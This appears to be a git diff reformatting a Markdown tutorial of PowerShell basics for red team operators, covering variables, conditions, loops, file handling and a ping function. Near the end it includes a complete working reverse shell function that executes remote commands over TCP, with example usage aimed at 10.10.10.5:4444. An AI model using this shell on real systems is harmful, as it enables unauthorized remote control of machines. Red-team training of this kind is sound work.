@@ -209,31 +209,39 @@ Get-Command | Format-Wide Name -Column 4
 
 
 
-# 📄 PowerShell Basic Notes for Red Team Operators
+# 🛡️ PowerShell Basics for Red Team Operators
 
+## 📌 Variables
 
+- Variables store data that can be used later.
+- Every variable starts with `$`.
 
-
-
-``# 🛡️ PowerShell Basics for Red Team Operators  ## 📌 Variables  - Variables store data that can be used later. - Every variable starts with `$`.  ```powershell $username = "admin" $port = 8080 $isConnected = $false $targetList = @("192.168.1.10", "192.168.1.20")``
+```powershell
+$username = "admin"
+$port = 8080
+$isConnected = $false
+$targetList = @("192.168.1.10", "192.168.1.20")
+```
 
 ---
 
 ## 📌 Data Types
 
-|Data Type|Example|Description|
-|---|---|---|
-|String|`"text"` or `'text'`|Text values|
-|Integer (Int)|`80`, `443`|Numeric values|
-|Boolean|`$true`, `$false`|True/False|
-|Array|`@("a", "b", "c")`|List of values|
-|HashTable|`@{key="value"}`|Key-Value pairs|
+| Data Type    | Example                 | Description          |
+|--------------|--------------------------|----------------------|
+| String       | `"text"` or `'text'`      | Text values          |
+| Integer (Int)| `80`, `443`               | Numeric values       |
+| Boolean      | `$true`, `$false`         | True/False           |
+| Array        | `@("a", "b", "c")`         | List of values       |
+| HashTable    | `@{key="value"}`           | Key-Value pairs      |
 
 > **Note:** You can explicitly declare data types:
 
-
-
-`[string]$ipAddress = "192.168.1.5" [int]$portNumber = 4444 [bool]$hasAccess = $true`
+```powershell
+[string]$ipAddress = "192.168.1.5"
+[int]$portNumber = 4444
+[bool]$hasAccess = $true
+```
 
 ---
 
@@ -241,33 +249,56 @@ Get-Command | Format-Wide Name -Column 4
 
 Conditions are used to make decisions during script execution.
 
-`if (condition) {     # Code if condition is true } elseif (anotherCondition) {     # Code if another condition is true } else {     # Code if all conditions are false }`
+```powershell
+if (condition) {
+    # Code if condition is true
+} elseif (anotherCondition) {
+    # Code if another condition is true
+} else {
+    # Code if all conditions are false
+}
+```
 
 ### Example: Check connection status
 
+```powershell
+$isConnected = $true
 
-`$isConnected = $true  if ($isConnected) {     Write-Output "Connection Successful!" } else {     Write-Output "Connection Failed!" }`
+if ($isConnected) {
+    Write-Output "Connection Successful!"
+} else {
+    Write-Output "Connection Failed!"
+}
+```
 
 ### Example: Check port
 
+```powershell
+$port = 80
 
-
-`$port = 80  if ($port -eq 80) {     Write-Output "HTTP service detected." } elseif ($port -eq 443) {     Write-Output "HTTPS service detected." } else {     Write-Output "Unknown service." }`
+if ($port -eq 80) {
+    Write-Output "HTTP service detected."
+} elseif ($port -eq 443) {
+    Write-Output "HTTPS service detected."
+} else {
+    Write-Output "Unknown service."
+}
+```
 
 ---
 
 ## 📌 Operators (Comparison Operators)
 
-|Operator|Meaning|
-|---|---|
-|`-eq`|Equals|
-|`-ne`|Not Equals|
-|`-gt`|Greater Than|
-|`-lt`|Less Than|
-|`-ge`|Greater or Equal|
-|`-le`|Less or Equal|
-|`-like`|String Matching|
-|`-contains`|Check existence in a collection|
+| Operator | Meaning         |
+|----------|-----------------|
+| `-eq`    | Equals           |
+| `-ne`    | Not Equals       |
+| `-gt`    | Greater Than     |
+| `-lt`    | Less Than        |
+| `-ge`    | Greater or Equal |
+| `-le`    | Less or Equal    |
+| `-like`  | String Matching  |
+| `-contains` | Check existence in a collection |
 
 ---
 
@@ -275,12 +306,29 @@ Conditions are used to make decisions during script execution.
 
 Functions allow you to define reusable code blocks.
 
-`function Function-Name {     param ($parameter1, $parameter2)     # Code block }`
+```powershell
+function Function-Name {
+    param ($parameter1, $parameter2)
+    # Code block
+}
+```
 
 ### Example: Ping a target
 
+```powershell
+function Test-Target {
+    param ($ipAddress)
 
-`function Test-Target {     param ($ipAddress)      if (Test-Connection -ComputerName $ipAddress -Count 1 -Quiet) {         Write-Output "$ipAddress is online."     } else {         Write-Output "$ipAddress is offline."     } }  # Usage Test-Target -ipAddress "192.168.1.10"`
+    if (Test-Connection -ComputerName $ipAddress -Count 1 -Quiet) {
+        Write-Output "$ipAddress is online."
+    } else {
+        Write-Output "$ipAddress is offline."
+    }
+}
+
+# Usage
+Test-Target -ipAddress "192.168.1.10"
+```
 
 ---
 
@@ -290,17 +338,32 @@ Loops are used to repeat actions.
 
 ### ForEach Loop
 
-`$targets = @("192.168.1.5", "192.168.1.10")  foreach ($target in $targets) {     Test-Target -ipAddress $target }`
+```powershell
+$targets = @("192.168.1.5", "192.168.1.10")
+
+foreach ($target in $targets) {
+    Test-Target -ipAddress $target
+}
+```
 
 ### For Loop
 
-
-`for ($i = 0; $i -lt 5; $i++) {     Write-Output "Attempt number: $i" }`
+```powershell
+for ($i = 0; $i -lt 5; $i++) {
+    Write-Output "Attempt number: $i"
+}
+```
 
 ### While Loop
 
+```powershell
+$count = 0
 
-`$count = 0  while ($count -lt 3) {     Write-Output "Connection Attempt: $count"     $count++ }`
+while ($count -lt 3) {
+    Write-Output "Connection Attempt: $count"
+    $count++
+}
+```
 
 ---
 
@@ -310,19 +373,24 @@ Handling files is critical for Red Team operations (e.g., writing logs, storing 
 
 ### Read a File
 
-
-
-`$content = Get-Content -Path "C:\temp\wordlist.txt" foreach ($line in $content) {     Write-Output $line }`
+```powershell
+$content = Get-Content -Path "C:\temp\wordlist.txt"
+foreach ($line in $content) {
+    Write-Output $line
+}
+```
 
 ### Write to a File
 
-
-`"Scan complete!" | Out-File -FilePath "C:\temp\log.txt"`
+```powershell
+"Scan complete!" | Out-File -FilePath "C:\temp\log.txt"
+```
 
 ### Append to a File
 
-
-`"New Entry" | Out-File -FilePath "C:\temp\log.txt" -Append`
+```powershell
+"New Entry" | Out-File -FilePath "C:\temp\log.txt" -Append
+```
 
 ---
 
@@ -330,18 +398,51 @@ Handling files is critical for Red Team operations (e.g., writing logs, storing 
 
 ### Create a Simple Reverse Shell
 
+```powershell
+function Start-ReverseShell {
+    param ($ip, $port)
 
-`function Start-ReverseShell {     param ($ip, $port)      $client = New-Object System.Net.Sockets.TCPClient($ip, $port)     $stream = $client.GetStream()     [byte[]]$bytes = 0..65535|%{0}      while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {         $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)         $sendback = (iex $data 2>&1 | Out-String )         $sendback2 = $sendback + "PS " + (pwd).Path + "> "         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)         $stream.Write($sendbyte,0,$sendbyte.Length)         $stream.Flush()     }      $client.Close() }  # Usage # Start-ReverseShell -ip "10.10.10.5" -port 4444`
+    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535|%{0}
 
+    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+        $sendback = (iex $data 2>&1 | Out-String )
+        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        $stream.Flush()
+    }
+
+    $client.Close()
+}
+
+# Usage
+# Start-ReverseShell -ip "10.10.10.5" -port 4444
+```
+
+---
+
+## ✅ Best Practices
+
+- Always use clear and meaningful variable names.
+- Organize your scripts using functions for better readability.
+- Handle sensitive data carefully (passwords, tokens, etc.).
+- Practice writing modular and reusable scripts.
+- Comment your code properly for future maintenance.
 
 ---
 
 # 📚 Useful Commands
 
-|Command|Purpose|
-|---|---|
-|`Test-Connection`|Ping targets|
-|`Invoke-WebRequest`|Send HTTP requests|
-|`Get-Content`|Read files|
-|`Out-File`|Write output to files|
-|`New-Object System.Net.Sockets.TCPClient`|Create TCP client|
+| Command                     | Purpose                             |
+|------------------------------|-------------------------------------|
+| `Test-Connection`            | Ping targets                       |
+| `Invoke-WebRequest`          | Send HTTP requests                 |
+| `Get-Content`                | Read files                         |
+| `Out-File`                   | Write output to files              |
+| `New-Object System.Net.Sockets.TCPClient` | Create TCP client  |
+
+---
+
